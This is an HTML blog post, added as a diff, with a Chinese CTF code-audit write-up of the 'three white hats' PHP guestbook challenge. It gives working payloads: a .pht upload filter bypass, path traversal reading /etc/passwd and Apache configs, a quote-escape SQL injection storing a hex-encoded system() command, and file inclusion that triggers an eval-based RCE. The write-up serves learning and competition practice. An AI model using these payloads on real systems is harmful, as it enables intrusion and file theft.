@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>代碼審計-三個白帽-条条大路通罗马系列1 - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="Virink,技术博客,CTF,Writeup,代码审计,AUDIT,writeups,ctf">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+<link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.com/atom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2016/05/07/three_white_hats_all_roads_lead_to_the_romes_1.html">代碼審計-三個白帽-条条大路通罗马系列1</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-05-07 18:25:10">2016-05-07 18:25:10</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>0x00 代碼審計</h2>
+<p>首先，根據 tips 1: web 源码下载 sgbmwww.rar 下載源碼，然後就開始了審計。</p>
+<p>大概看一下index.php的流程</p>
+<pre><code>if($_M['form']['submit']){
+    if($_M['form']['formname'] || $_FILES['file']['name']){
+        $upfile = new upfile();
+        $upfile-&gt;set('savepath', '');
+        $upfile-&gt;set('is_rename', $_M['form']['is_rename']);
+        $back = $upfile-&gt;upload($_M['form']['formname']);
+    }
+
+    $gb_array = [
+        "name" =&gt; htmlspecialchars(filter($_M['form']['name'])),
+        "message" =&gt; htmlspecialchars(filter($_M['form']['message'])),
+        "filename" =&gt; $back,
+    ];
+    op($gb_array);
+    $content = jsonencode($gb_array);
+    $sql = "insert into guestbook(`content`) values('".$content."');";
+    op($sql);
+    $result = mysql_query($sql);
+    if($result)
+    {
+        echo "thx for your feedback~";
+    }else{
+        op(mysql_error());
+    }
+}
+</code></pre>
+<p>主要是上傳漏洞getshell。</p>
+<p>首先<code>include_once 'init.php';</code>初始化文件裏面再包含兩個文件<code>include 'config.php';include 'include.php';</code></p>
+<p>config.php主要是數據庫配置。</p>
+<p>include.php是一些公共函數，fifter和json處理。</p>
+<pre><code>/*** 
+获取GET,POST,COOKIE，存放在$_M['form']，系统表单提交变量数组
+*/
+$_M['form'] =array();
+isset($_REQUEST['GLOBALS']) &amp;&amp; exit('Access Error');
+foreach($_COOKIE as $_key =&gt; $_value) {
+    $_key{0} != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value);
+}
+foreach($_POST as $_key =&gt; $_value) {
+    $_key{0} != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value);
+}
+foreach($_GET as $_key =&gt; $_value) {
+    $_key{0} != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value);
+}
+</code></pre>
+<p>再看upfile.php，一個上傳類。</p>
+<p>獲取表單文件，過濾了php相關後綴</p>
+<pre><code>//文件后缀是否为合法后缀
+$this-&gt;getext($filear["name"]); //获取允许的后缀
+if (strtolower($this-&gt;ext)=='php'||strtolower($this-&gt;ext)=='php3'||strtolower($this-&gt;ext)=='php4'||strtolower($this-&gt;ext)=='php5') {
+    return false;
+}
+</code></pre>
+<p>存在一個控制重命名功能</p>
+<pre><code>//文件名重命名
+$this-&gt;set_savename($filear["name"], $this-&gt;is_rename);
+</code></pre>
+<h2>0x01 非常規思路的黑科技</h2>
+<p>顧名思義，非常規思路就是繞過了出題人的解題思路達到突破getflag的目的。</p>
+<p>主要代碼</p>
+<pre><code>if($_M['form']['formname'] || $_FILES['file']['name']){
+    $upfile = new upfile();
+    $upfile-&gt;set('savepath', '');
+    $upfile-&gt;set('is_rename', $_M['form']['is_rename']);
+    $back = $upfile-&gt;upload($_M['form']['formname']);
+}
+</code></pre>
+<p>前天表單沒有<code>is_rename</code>這個參數，可以抓包自行添加。</p>
+<p>根據代碼</p>
+<pre><code>protected function set_savename($filename, $is_rename) {
+if ($is_rename) {
+    srand((double)microtime() * 1000000);
+    $rnd = rand(100, 999);
+    $filename = date('U') + $rnd;
+    op(date('U') );
+    $filename = $filename.".".$this-&gt;ext;   
+} else {
+</code></pre>
+<p>當<code>is_rename</code>為假的情況就是直接取用發送的文件名而不重命名。既<code>is_rename=0</code>。</p>
+<p>然後利用黑科技突破後綴的限制。</p>
+<p>代碼裏限制了<strong>php、php3、php4、php5</strong>。但是忽略了<strong>pht</strong>這個也是能夠解析的後綴。</p>
+<p>於是乎，秒破了。23333</p>
+<blockquote>
+<p>這個思路，略猥瑣的樣子。</p>
+</blockquote>
+<h2>0x02 常規思路</h2>
+<p>其實一開始我不是用非常規思路。 也確實沒有第一時間想到pht這個黑科技。</p>
+<pre><code>if($_M['form']['formname'] || $_FILES['file']['name']){
+</code></pre>
+<p>這裡存在倆個輸入輸入來源，此處必有蹊蹺。</p>
+<p>然後，跟進<code>$back = $upfile-&gt;upload($_M['form']['formname']);</code></p>
+<pre><code>public function upload($form = '') {
+    global $_M;
+    if (is_array($form)) {
+        $filear = $form;
+    }else{
+        $filear = $_FILES[$form];
+    }
+    if(!$filear){
+        foreach($_FILES as $key =&gt; $val){
+            $filear = $_FILES[$key];
+            break;
+        }
+    }
+    ...
+</code></pre>
+<p>可以自定義<code>formname</code>參數而不用FILES表單。既<code>$filear = $form;</code>。</p>
+<p>再往下看</p>
+<pre><code>//复制文件
+$upfileok=0;
+$file_tmp=$filear["tmp_name"];
+$file_name=$this-&gt;savepath.$this-&gt;savename;
+if (function_exists("move_uploaded_file")) {
+    if (move_uploaded_file($file_tmp, $file_name)) {
+        $upfileok=1;
+    } else if (copy($file_tmp, $file_name)) {
+        $upfileok=1;
+    }
+} elseif (copy($file_tmp, $file_name)) {
+    $upfileok=1;
+}
+if ($upfileok) {
+    @unlink($filear['tmp_name']); //Delete temporary files
+}
+</code></pre>
+<p>可以看到，參數<code>formname[name]</code>和<code>formname[tmp_name]</code>是可控的。</p>
+<p>再看數據來源過濾，只是進行了一下簡單的<strong>addslashes</strong>轉義</p>
+<pre><code>function daddslashes($string, $force = 0) {
+    !defined('MAGIC_QUOTES_GPC') &amp;&amp; define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
+    if(!MAGIC_QUOTES_GPC || $force) {
+        if(is_array($string)) {
+            foreach($string as $key =&gt; $val) {
+                $string[$key] = daddslashes($val, $force);
+            }
+        } else {
+            $string = trim(addslashes($string));
+        }
+    }
+    return $string;
+}
+</code></pre>
+<p>於是就存在任意文件讀取了。</p>
+<p><code>formname[tmp_name]</code>為任意文件，有讀取權限就能copy到upload目錄。</p>
+<pre><code>formname[tmp_name]=../../../../../../../../etc/passwd
+</code></pre>
+<p>成功讀取到了。</p>
+<p>然後再看http頭可以知道是nginx服務器，於是就翻找其配置文件。</p>
+<p>為什麼要找配置文件呢。因為題目來有sql的insert，還有jsondeconde等函數在源碼裏面根本沒用上。</p>
+<p>必定還存在其他的源碼。有根據挑戰介紹，<strong>WEB：三个白猫寻找后台之旅</strong>，必定存在後臺。</p>
+<p>然而掃目錄並沒有發現，估計是存在另一個網站。</p>
+<p>通過非常規思路getflag之後，我問了下出題人，</p>
+<p><strong>沒想到這裡就是一個坑，由於結界是docker，通過反代理出來的。所以才顯示nginx，其實是apache服務器的。也確實存在另一個站點——後臺！</strong></p>
+<p>這個常規也是之後複現的。</p>
+<pre><code>formname[tmp_name]=../../../../../../../../etc/apache2/apache2.conf
+formname[name]=vapache.txt
+</code></pre>
+<p>得到</p>
+<pre><code>&lt;VirtualHost *:80&gt;
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html/sgbmwww
+&lt;/VirtualHost&gt;
+&lt;VirtualHost *:8080&gt;
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html/sgbmadmin
+&lt;/VirtualHost&gt;
+</code></pre>
+<p>然後猜測sgbmadmin也存在源碼。</p>
+<p>直接訪問8080端口是行不通的（出題人師傅說的，表示愣逼）</p>
+<p>任意文件讀取再次走起，成功讀到了源碼包。</p>
+<p>審計後臺的代碼。果斷發現用到了<code>jsondecode()</code>。</p>
+<pre><code>function jsondecode($json){
+    if($json){
+        $convert = false;
+        $str = '$arr=';
+        for ($i=0; $i&lt;strlen($json); $i++){
+            if (!$convert){
+                if (($json[$i] == '{') || ($json[$i] == '[')){
+                    $str .= ' array(';
+                }else if (($json[$i] == '}') || ($json[$i] == ']')){
+                    $str .= ')';
+                }else if ($json[$i] == ':'){
+                    $str .= '=&gt;';
+                }else{
+                    $str .= $json[$i];
+                }                                    
+            }else{
+                $str .= $json[$i];
+            }         
+            if ($json[$i] == '"' &amp;&amp; $json[($i-1)]!="\\"){
+                $convert = !$convert;
+            }
+        }
+        $str = str_replace(array('\\\\' ,'\\/'), array('\\' ,'/'), $str);
+        @eval($str . ';');
+    }else{
+        $arr = array();
+    }
+    return $arr;
+}
+</code></pre>
+<p>很明顯，存在任意命令執行。</p>
+<p>通過上傳一個非php解密後綴的文件，然後構造命令執行給文件改名達到getshell的目的。</p>
+<p>命令執行是後臺文件才有的，所以要通過前臺頁面的文件包含漏洞調用。</p>
+<p>首先，上傳一個vir.vir的shell文件。</p>
+<p>回到index.php</p>
+<pre><code>$gb_array = [
+    "name" =&gt; htmlspecialchars(filter($_M['form']['name'])),
+    "message" =&gt; htmlspecialchars(filter($_M['form']['message'])),
+    "filename" =&gt; $back,
+];
+$content = jsonencode($gb_array);
+$sql = "insert into guestbook(`content`) values('".$content."');";
+</code></pre>
+<p><strong>$back</strong>的數據沒有經過<code>htmlspecialchars(filter(</code>處理。</p>
+<p>溯源，<code>$back = $upfile-&gt;upload($_M['form']['formname']);</code></p>
+<p><code>$back</code>來自<code>$this-&gt;savename</code>。而<code>$this-&gt;savename</code>有一個特殊的過濾導致轉義的單引號逃逸了。</p>
+<p>我們可以同截斷單引號，構造特殊語句，把命令插入到數據庫。</p>
+<p>由於mysql的特性，<strong>insert into table</strong>語句可以插入多条数据。</p>
+<pre><code>insert into guestbook(`content`) values('xxx'),('xxx');
+</code></pre>
+<p>我們在文件名輸入單引號<code>'</code>，進過轉義變成<code>\'</code>/,又因為</p>
+<pre><code>protected function set_savename($filename, $is_rename) {
+    if ($is_rename) {
+        ...
+    } else {
+        ...
+        $filename = str_replace(array(":", "*", "?", "|", "/" , "\\" , "\"" , "&lt;" , "&gt;" , "——" , " " ),'_',$filename);
+        ...
+</code></pre>
+<p>使得<code>\'</code>變成了<code>_'</code>。</p>
+<p>sql語句就編程了</p>
+<pre><code>insert into guestbook(`content`) values('{"name":"a","message":"a","filename":"upload\/_'"}');
+</code></pre>
+<p><strong>#、（</strong> 和 <strong>）</strong> 都沒有過濾，構造閉合第一條數據，再構造第二條命令數據，然後用 <strong>#</strong> 截斷。</p>
+<p>命令數據轉16進制插入數據庫就ok了</p>
+<pre><code>system('mv /var/www/html/sgbmwww/upload/vir.vir /var/www/html/sgbmwww/upload/vir.php')
+</code></pre>
+<p>轉</p>
+<pre><code>0x73797374656D28276D76202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E766972202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E7068702729
+</code></pre>
+<p>既</p>
+<pre><code>formname[name]='),(0x73797374656D28276D76202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E766972202F7661722F7777772F68746D6C2F7367626D7777772F75706C6F61642F7669722E7068702729)#
+formname[tmp_name]=任意內容
+</code></pre>
+<p>成功插入命令數據之後訪問</p>
+<pre><code>http://521fe8480e00135dc.jie.sangebaimao.com/index.php?class=../sgbmadmin/index
+</code></pre>
+<p>基本上就能成功執行任意命令，修改文件名getshell了。</p>
+<p>出題人還很貼心，怕你的命令被別人刷沒，特意用</p>
+<pre><code>$sql = "select id,content from guestbook where content like '%".$_M['form']['search']."%' order by id desc limit 0,1;";
+</code></pre>
+<p>search一下你的命令就完美執行了。</p>
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/05/07/three_white_hats_all_roads_lead_to_the_romes_1.html" target="_blank">代碼審計-三個白帽-条条大路通罗马系列1</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-05-07 18:25:10">2016-05-07 18:25:10</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:40:36">2017-06-01 23:40:36</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/05/07/three_white_hats_all_roads_lead_to_the_romes_1.html" title="代碼審計-三個白帽-条条大路通罗马系列1" target="_blank">https://www.virzz.com/2016/05/07/three_white_hats_all_roads_lead_to_the_romes_1.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2018-2019. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">concise</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
